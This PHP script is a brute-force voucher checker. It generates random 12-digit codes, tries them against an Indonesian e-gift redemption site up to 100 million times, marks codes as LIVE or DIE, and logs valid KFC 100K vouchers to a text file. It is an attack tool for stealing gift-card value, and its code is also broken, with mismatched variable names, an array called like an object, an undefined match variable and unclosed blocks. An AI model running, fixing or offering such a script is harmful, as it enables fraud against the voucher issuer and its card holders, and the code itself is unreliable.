<?php
    function getCurl($data) {
		
            // echo "<pre>";
            // print_r($data);
            // echo "</pre>";
            $curl = curl_init();

            curl_setopt_array($curl, array(
                CURLOPT_URL => $data['url'],
                CURLOPT_RETURNTRANSFER => true,
                // CURLOPT_SSL_VERIFYHOST => 0,
                // CURLOPT_SSL_VERIFYPEER => 0,
                CURLOPT_ENCODING => "",
                CURLOPT_MAXREDIRS => 10,
                CURLOPT_TIMEOUT => 30,
                CURLOPT_HTTPHEADER => $data['header'],
                CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
                CURLOPT_CUSTOMREQUEST => $data['method'],
                CURLOPT_POSTFIELDS => $data['parser'],
            ));
    
            
            $response = curl_exec($curl);
            $err = curl_error($curl);
        
            curl_close($curl);
    
            if ($err) return $err;
            else return $response;
        }
        
        function random($length = 12) {
            $characters = '0123456789';
            $charactersLength = strlen($characters);
            $randomString = '';
            for ($i = 0; $i < $length; $i++) {
                $randomString .= $characters[rand(0, $charactersLength - 1)];
            }
            return $randomString;
        }


        function getCode() {
            $main_url = "http://e-egift.id/redeem.php?code=";
		  
            // return json_encode([]);
            
           
            // $data

            for($i=0;$i<100000000;$i++){
                $rand = random() ;
		  
			    


            $curl['code'] = [
                'url' =>  $main_url.$rand,
                'parser' => null,
                'header' => [
                    // "Authorization:  Basic ".$this->token,
                    "Content-Type:  application/json",
                ],
                'method' => "GET",
				
                
            ];
            	$page = $curl->get('http://egift.id/'.$random.'');
	if (stripos($page, 'h1 style="top: 0;">')) {
				preg_match_all('/<span id="p_item_name">KFC VALUE 100K VOUCHER</span>/', $page);
		echo ''.$i.'.LIVE => http://egift.id/'.$random.' | '.$nom[1][0].'';
		$data =  "http://egift.id/".$random." | '.$nom[1][0].' \r\n";
		$fh = fopen("cdy-kfc.txt", "a");
		fwrite($fh, $data);
		fclose($fh);
									echo "\n";
	}else	if (stripos($page, '<h1>E-VOUCHER</h1>')) {

		echo ''.$i.'.DIE => http://egift.id/'.$random.'';
									echo "\n";
	}else{
		echo ' ERROR '.$random;
									echo "\n";
	}
		flush();
		ob_flush();
	$i++;
}
?>
